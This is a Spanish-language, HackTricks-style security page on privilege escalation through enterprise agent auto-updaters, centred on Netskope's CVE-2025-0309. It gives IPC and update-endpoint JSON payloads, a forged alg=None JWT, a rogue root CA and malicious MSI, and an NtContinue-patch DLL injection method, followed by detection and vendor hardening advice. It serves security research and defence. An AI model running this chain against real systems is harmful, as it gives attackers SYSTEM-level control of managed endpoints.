# Abusing Enterprise Auto-Updaters and Privileged IPC (p. ej., Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza una clase de cadenas de escalada de privilegios locales en Windows encontradas en agentes de endpoint empresariales y updaters que exponen una superficie IPC de baja fricción y un flujo de actualización privilegiado. Un ejemplo representativo es Netskope Client for Windows < R129 (CVE-2025-0309), donde un usuario de bajos privilegios puede forzar el registro en un servidor controlado por el atacante y luego entregar un MSI malicioso que instala el servicio SYSTEM.

Ideas clave que puedes reutilizar contra productos similares:
- Abusar del localhost IPC de un servicio privilegiado para forzar el re‑registro o la reconfiguración hacia un servidor controlado por el atacante.
- Implementar los endpoints de actualización del proveedor, entregar una Trusted Root CA maliciosa y apuntar el updater a un paquete malicioso “signed”.
- Eludir verificaciones de firmante débiles (CN allow‑lists), flags de digest opcionales y propiedades laxas de MSI.
- Si el IPC está “encrypted”, derivar la key/IV a partir de identificadores de máquina legibles por todos almacenados en el registry.
- Si el servicio restringe los llamantes por image path/process name, inyectar en un proceso en la allow‑list o spawnear uno suspended y bootstrapear tu DLL vía un parche mínimo de thread‑context.

---
## 1) Forcing enrollment to an attacker server via localhost IPC

Muchos agentes incluyen un proceso UI en user‑mode que se comunica con un servicio SYSTEM vía localhost TCP usando JSON.

Observed in Netskope:
- UI: stAgentUI (integridad baja) ↔ Service: stAgentSvc (SYSTEM)
- Comando IPC ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flujo de explotación:
1) Crea un token de registro JWT cuyas claims controlen el host backend (p. ej., AddonUrl). Usa alg=None para que no se requiera firma.
2) Envía el mensaje IPC invocando el comando de provisioning con tu JWT y el nombre del tenant:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) El servicio comienza a contactar tu servidor malicioso para enrollment/config, p. ej.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- Si la verificación del llamador se basa en ruta/nombre, origina la solicitud desde un binario del proveedor en la lista permitida (ver §4).

---
## 2) Secuestrar el canal de actualizaciones para ejecutar código como SYSTEM

Una vez que el cliente se comunique con tu servidor, implementa los endpoints esperados y redirígelo a un MSI del atacante. Secuencia típica:

1) /v2/config/org/clientconfig → Devuelve una configuración JSON con un intervalo de actualización muy corto, p. ej.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Devuelve un certificado CA en formato PEM. El servicio lo instala en el Local Machine Trusted Root store.
3) /v2/checkupdate → Proporciona metadata que apunta a un MSI malicioso y una versión falsa.

Bypassing common checks seen in the wild:
- Signer CN allow‑list: el servicio puede solo comprobar que el Subject CN sea “netSkope Inc” o “Netskope, Inc.”. Tu CA malintencionada puede emitir un leaf con ese CN y firmar el MSI.
- CERT_DIGEST property: incluye una propiedad MSI benigna llamada CERT_DIGEST. No hay aplicación en la instalación.
- Optional digest enforcement: un flag de config (p. ej., check_msi_digest=false) deshabilita validación criptográfica adicional.

Resultado: el servicio SYSTEM instala tu MSI desde
C:\ProgramData\Netskope\stAgent\data\*.msi
ejecutando código arbitrario como NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Desde R127, Netskope envolvió el JSON de IPC en un campo encryptData que parece Base64. El reversing mostró AES con key/IV derivados de valores de registro legibles por cualquier usuario:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Los atacantes pueden reproducir la encriptación y enviar comandos encriptados válidos desde un usuario estándar. Consejo general: si un agent de repente “encripta” su IPC, busca device IDs, product GUIDs, install IDs bajo HKLM como material.

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

Algunos servicios intentan autenticar al peer resolviendo el PID de la conexión TCP y comparando la ruta/nombre de la imagen contra binarios allow‑listed del vendor ubicados bajo Program Files (p. ej., stagentui.exe, bwansvc.exe, epdlp.exe).

Dos bypass prácticos:
- DLL injection en un proceso allow‑listed (p. ej., nsdiag.exe) y proxear IPC desde dentro de él.
- Spawn de un binario allow‑listed en estado suspended y bootstrap de tu proxy DLL sin CreateRemoteThread (ver §5) para satisfacer reglas de tamper impuestas por drivers.

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

Los productos suelen incluir un driver con minifilter/OB callbacks (p. ej., Stadrv) para eliminar derechos peligrosos de handles a procesos protegidos:
- Process: remueve PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restringe a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader user‑mode fiable que respeta estas restricciones:
1) CreateProcess de un binario del vendor con CREATE_SUSPENDED.
2) Obtener handles que aún puedes: PROCESS_VM_WRITE | PROCESS_VM_OPERATION en el proceso, y un thread handle con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (o solo THREAD_RESUME si parcheas código en un RIP conocido).
3) Sobrescribir ntdll!NtContinue (u otro thunk temprano garantizado mapeado) con un stub mínimo que llame a LoadLibraryW sobre la ruta de tu DLL, y luego salte de vuelta.
4) ResumeThread para disparar tu stub in‑process, cargando tu DLL.

Porque nunca usaste PROCESS_CREATE_THREAD o PROCESS_SUSPEND_RESUME sobre un proceso ya protegido (tú lo creaste), la política del driver queda satisfecha.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatiza una rogue CA, firma de MSI malicioso, y sirve los endpoints necesarios: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope es un IPC client custom que crea mensajes IPC arbitrarios (opcionalmente AES‑encriptados) e incluye la inyección por proceso suspendido para originar desde un binario allow‑listed.

---
## 7) Detection opportunities (blue team)
- Monitoriza adiciones al Local Machine Trusted Root. Sysmon + registry‑mod eventing (ver SpecterOps guidance) funciona bien.
- Marca ejecuciones de MSI iniciadas por el servicio del agent desde rutas como C:\ProgramData\<vendor>\<agent>\data\*.msi.
- Revisa logs del agent por hosts/tenants de enrolamiento inesperados, p. ej.: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – busca addonUrl / tenant anomalies y provisioning msg 148.
- Alerta sobre clientes IPC localhost que no sean los binarios firmados esperados, o que se originen desde árboles de procesos inusuales.

---
## Hardening tips for vendors
- Ata los hosts de enrolamiento/update a una allow‑list estricta; rechaza dominios no confiables en clientcode.
- Autentica peers de IPC con primitivas del OS (ALPC security, named‑pipe SIDs) en lugar de checks por ruta/nombre de imagen.
- Mantén material secreto fuera de HKLM legible por el mundo; si IPC debe estar encriptado, deriva keys de secretos protegidos o negocia sobre canales autenticados.
- Trata el updater como una superficie de supply‑chain: requiere una cadena completa hacia una CA de confianza que controles, verifica firmas de paquetes contra keys pinned, y falla cerrado si la validación está deshabilitada en la config.

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
